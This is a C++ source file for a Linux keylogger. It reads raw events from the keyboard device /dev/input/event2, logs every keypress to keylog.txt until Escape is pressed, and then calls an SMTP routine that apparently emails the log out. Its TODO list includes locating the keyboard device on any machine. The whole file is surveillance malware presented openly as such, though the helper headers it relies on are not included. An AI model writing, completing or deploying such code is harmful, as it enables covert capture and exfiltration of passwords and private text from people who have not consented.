#include <fcntl.h>
//using open;

#include <unistd.h>

#include <string>
using std::string;

#include "linux_keyrecord.h"
//#include "keydb.h"
#include "keytxt.h"
#include "keyrecord.h"
#include "keyvalue.h"
using namespace keylog;

#include "smtp-attach.h"


/*
	TODO:
		- determine when to write to db file (vs keeping keyrecords in memory)
		- implement threading on the device file reader?
		- get keyboard device file for any machine
		- user determination of db filename/location
*/

int main() {

	string device_filename;
	//string db_filename;
	string txt_filename;

	//device_filename = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
	device_filename = "/dev/input/event2";

	//db_filename = "keylog.db";
	txt_filename = "keylog.txt";

	int device_file = open(device_filename.c_str(), O_RDONLY);
	//keylog_db::KeyDB keydb = keylog_db::KeyDB(db_filename);
	keylog_txt::KeyTXT keytxt = keylog_txt::KeyTXT(txt_filename);

	struct input_event event;

#ifdef __linux__
#endif
    bool running = true;
	while(running) {
        read(device_file, &event, sizeof(struct input_event));

        if(event.type == 1) {
            keylog::KeyRecord* keyRecord;

            keyRecord = new keylog_linux::KeyRecord(event);

            //keydb.insert(keyRecord);
            keytxt.insert(keyRecord);

            if(keyRecord->getValue() == keylog::value_esc) {
                running = false;
            }

            delete keyRecord;
        }
    }


    keytxt.close();

        //main_tls(fopen(db_filename.c_str(), "r"));

        //main_smtp();

    main_smtp();

	close(device_file);
}
